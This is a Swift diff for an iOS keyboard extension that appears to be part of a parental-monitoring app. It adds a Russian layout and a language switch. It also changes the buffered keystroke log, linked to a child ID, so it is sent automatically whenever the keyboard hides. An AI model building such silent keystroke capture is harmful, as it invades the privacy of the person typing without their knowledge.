@@ -17,6 +17,13 @@ struct KeystrokeLog: Codable {
 
 class KeyboardViewController: UIInputViewController {
     
+    enum KeyboardLanguage {
+        case english
+        case russian
+    }
+    
+    private var keyboardLanguage: KeyboardLanguage = .english
+    
     // --- Буфер для сбора текста ---
     private var textBuffer: String = ""
     
@@ -57,13 +64,24 @@ class KeyboardViewController: UIInputViewController {
     private var shiftButton: UIButton!
     private var deleteButton: UIButton!
     private var switchModeButton: UIButton!
+    private var languageModeButton: UIButton!
     
     // --- Буквы для разных режимов ---
-    private let letterRows = [
+    private var currentRows: [[String]] = [[]]
+    
+    private let englishLetterRows = [
         ["q", "w", "e", "r", "t", "y", "u", "i", "o", "p"],
         ["a", "s", "d", "f", "g", "h", "j", "k", "l"],
         ["z", "x", "c", "v", "b", "n", "m"]
     ]
+    
+    // Русская ЙЦУКЕН раскладка
+    private let russianLetterRows = [
+        ["й", "ц", "у", "к", "е", "н", "г", "ш", "щ", "з", "х", "ъ"],
+        ["ф", "ы", "в", "а", "п", "р", "о", "л", "д", "ж", "э"],
+        ["я", "ч", "с", "м", "и", "т", "ь", "б", "ю"]
+    ]
+    
     
     private let numberRows = [
         ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"],
@@ -87,6 +105,14 @@ class KeyboardViewController: UIInputViewController {
         // Получаем ID ребенка из AppGroup
         if let defaults = UserDefaults(suiteName: "group.com.laborato.test.Parent") {
             self.childID = defaults.string(forKey: "myChildRecordID")
+        }
+        
+        // Восстанавливаем сохраненный язык из UserDefaults
+        if let defaults = UserDefaults(suiteName: "group.com.laborato.test.Parent") {
+            if let savedLanguage = defaults.string(forKey: "keyboardLanguage"),
+               savedLanguage == "russian" {
+                keyboardLanguage = .russian
+            }
         }
         
         // Создаем и настраиваем UI клавиатуры
@@ -140,8 +166,13 @@ class KeyboardViewController: UIInputViewController {
         firstRowStack.axis = .horizontal
         firstRowStack.spacing = 4
         firstRowStack.distribution = .fillEqually
-        
-        for key in letterRows[0] {
+            
+        switch keyboardLanguage {
+        case .english: currentRows = englishLetterRows
+        case .russian: currentRows = russianLetterRows
+        }
+
+        for key in currentRows[0] {
             let button = createKeyButton(title: key)
             firstRowStack.addArrangedSubview(button)
         }
@@ -155,20 +186,24 @@ class KeyboardViewController: UIInputViewController {
         secondRowStack.spacing = 4
         secondRowStack.distribution = .fillEqually
         
-        // Левый отступ
-        let secondLeftSpacer = UIView()
-        secondLeftSpacer.widthAnchor.constraint(equalToConstant: 10).isActive = true
-        secondRowStack.addArrangedSubview(secondLeftSpacer)
+        if keyboardLanguage == .english {
+            // Левый отступ
+            let secondLeftSpacer = UIView()
+            secondLeftSpacer.widthAnchor.constraint(equalToConstant: 10).isActive = true
+            secondRowStack.addArrangedSubview(secondLeftSpacer)
+        }
         
-        for key in letterRows[1] {
+        for key in currentRows[1] {
             let button = createKeyButton(title: key)
             secondRowStack.addArrangedSubview(button)
         }
         
-        // Правый отступ
-        let secondRightSpacer = UIView()
-        secondRightSpacer.widthAnchor.constraint(equalToConstant: 10).isActive = true
-        secondRowStack.addArrangedSubview(secondRightSpacer)
+        if keyboardLanguage == .english {
+            // Правый отступ
+            let secondRightSpacer = UIView()
+            secondRightSpacer.widthAnchor.constraint(equalToConstant: 10).isActive = true
+            secondRowStack.addArrangedSubview(secondRightSpacer)
+        }
         
         letterStacks.append(secondRowStack)
         mainStack.addArrangedSubview(secondRowStack)
@@ -184,7 +219,7 @@ class KeyboardViewController: UIInputViewController {
         thirdRowStack.addArrangedSubview(shiftButton)
         
         // 2. БУКВЫ Z-M (7 букв)
-        for key in letterRows[2] {
+        for key in currentRows[2] {
             let button = createKeyButton(title: key)
             thirdRowStack.addArrangedSubview(button)
         }
@@ -202,6 +237,10 @@ class KeyboardViewController: UIInputViewController {
         fourthRowStack.spacing = 4
         fourthRowStack.distribution = .fill
         
+        languageModeButton = createSpecialButton(title: keyboardLanguage == .english ? "Рус" : "Eng", action: #selector(didTapSwitchLanguage))
+        languageModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
+        fourthRowStack.addArrangedSubview(languageModeButton)
+        
         // 1. Кнопка переключения режима слева
         switchModeButton = createSpecialButton(title: "123", action: #selector(didTapSwitchMode))
         switchModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
@@ -211,7 +250,7 @@ class KeyboardViewController: UIInputViewController {
         let spaceButton = createSpecialButton(title: "space", action: #selector(didTapSpace))
         
         // 3. Кнопка отправки
-        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapSend))
+        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapEnter))
         sendButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
         
         fourthRowStack.addArrangedSubview(spaceButton)
@@ -288,13 +327,17 @@ class KeyboardViewController: UIInputViewController {
         fourthRowStack.spacing = 4
         fourthRowStack.distribution = .fill
         
+        let languageModeButton = createSpecialButton(title: keyboardLanguage == .english ? "Рус" : "Eng", action: #selector(didTapSwitchLanguage))
+        languageModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
+        fourthRowStack.addArrangedSubview(languageModeButton)
+        
         let switchToLettersButton = createSpecialButton(title: "ABC", action: #selector(didTapSwitchToLetters))
         switchToLettersButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
         fourthRowStack.addArrangedSubview(switchToLettersButton)
         
         let spaceButton = createSpecialButton(title: "space", action: #selector(didTapSpace))
         
-        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapSend))
+        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapEnter))
         sendButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
         
         fourthRowStack.addArrangedSubview(spaceButton)
@@ -368,6 +411,10 @@ class KeyboardViewController: UIInputViewController {
         fourthRowStack.spacing = 4
         fourthRowStack.distribution = .fill
         
+        let languageModeButton = createSpecialButton(title: keyboardLanguage == .english ? "Рус" : "Eng", action: #selector(didTapSwitchLanguage))
+        languageModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
+        fourthRowStack.addArrangedSubview(languageModeButton)
+        
         // Кнопка переключения на буквы
         let switchToLettersButton = createSpecialButton(title: "ABC", action: #selector(didTapSwitchToLetters))
         switchToLettersButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
@@ -377,7 +424,7 @@ class KeyboardViewController: UIInputViewController {
         let spaceButton = createSpecialButton(title: "space", action: #selector(didTapSpace))
         
         // Кнопка отправки
-        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapSend))
+        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapEnter))
         sendButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
         
         fourthRowStack.addArrangedSubview(spaceButton)
@@ -611,11 +658,14 @@ class KeyboardViewController: UIInputViewController {
         textBuffer.append(" ")
     }
     
-    @objc func didTapSend() {
-        print("▶️ Нажата кнопка 'Отправить'.")
+    @objc func didTapEnter() {
+        textDocumentProxy.insertText("\n")
+    }
+    
+    func didTapSend() {
+        print("▶️ Отправляем данные при скрытии клавиатуры.")
         
         textDocumentProxy.insertText("\n")
-        textBuffer.append("\n<SEND>")
         
         guard hasFullAccess, !textBuffer.isEmpty, let childID = self.childID else {
             if !hasFullAccess { print("⚠️ Нет полного доступа для отправки.") }
@@ -655,10 +705,10 @@ class KeyboardViewController: UIInputViewController {
                 let endIndex = rowStack.arrangedSubviews.count - 1
                 
                 for index in startIndex..<endIndex {
-                    guard index - 1 < letterRows[2].count else { continue }
+                    guard index - 1 < currentRows[2].count else { continue }
                     guard let button = rowStack.arrangedSubviews[index] as? UIButton else { continue }
                     
-                    let originalTitle = letterRows[2][index - 1]
+                    let originalTitle = currentRows[2][index - 1]
                     let newTitle = isUppercase ? originalTitle.uppercased() : originalTitle.lowercased()
                     button.setTitle(newTitle, for: .normal)
                 }
@@ -673,9 +723,9 @@ class KeyboardViewController: UIInputViewController {
                         adjustedIndex = keyIndex
                     }
                     
-                    guard adjustedIndex >= 0 && adjustedIndex < letterRows[rowIndex].count else { continue }
+                    guard adjustedIndex >= 0 && adjustedIndex < currentRows[rowIndex].count else { continue }
                     
-                    let originalTitle = letterRows[rowIndex][adjustedIndex]
+                    let originalTitle = currentRows[rowIndex][adjustedIndex]
                     let newTitle = isUppercase ? originalTitle.uppercased() : originalTitle.lowercased()
                     button.setTitle(newTitle, for: .normal)
                 }
@@ -703,9 +753,29 @@ class KeyboardViewController: UIInputViewController {
     override func viewWillDisappear(_ animated: Bool) {
         super.viewWillDisappear(animated)
         stopDeleteAutoRepeat()
+        didTapSend()
     }
     
     deinit {
         stopDeleteAutoRepeat()
+    }
+    
+    @objc func didTapSwitchLanguage() {
+        // Переключаем язык
+        keyboardLanguage = (keyboardLanguage == .english) ? .russian : .english
+        
+        // Сохраняем выбор языка в UserDefaults
+        if let defaults = UserDefaults(suiteName: "group.com.laborato.test.Parent") {
+            let languageString = keyboardLanguage == .english ? "english" : "russian"
+            defaults.set(languageString, forKey: "keyboardLanguage")
+            defaults.synchronize()
+        }
+        
+        // Обновляем раскладку
+        updateKeyboardLayout()
+        
+        // Вибрация для обратной связи
+        let generator = UIImpactFeedbackGenerator(style: .light)
+        generator.impactOccurred()
     }
 }
